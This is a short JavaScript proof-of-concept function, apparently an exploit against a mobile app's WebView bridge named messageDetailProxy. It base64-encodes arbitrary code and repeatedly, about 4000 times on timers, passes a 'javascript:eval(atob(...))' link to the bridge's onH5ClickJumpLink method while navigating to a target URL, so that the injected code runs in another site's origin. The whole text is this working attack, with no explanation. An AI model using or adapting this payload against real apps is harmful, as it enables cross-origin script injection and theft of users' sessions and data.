function triggerPoc(url, code) {         const currUrl = location.href;         const payload = `         if (!location.href.startsWith("${currUrl}") && !window.__cloudx_called) {             window.__cloudx_called = true;             ${code}         }     `;         const base64 = btoa(payload);         for (let i = 0; i < 4000; i++) {             setTimeout(function () {                                      window.messageDetailProxy.onH5ClickJumpLink(                        1, `javascript:eval(atob("${base64}"));//`                     );                              }, i);         }         location.href = url;     }
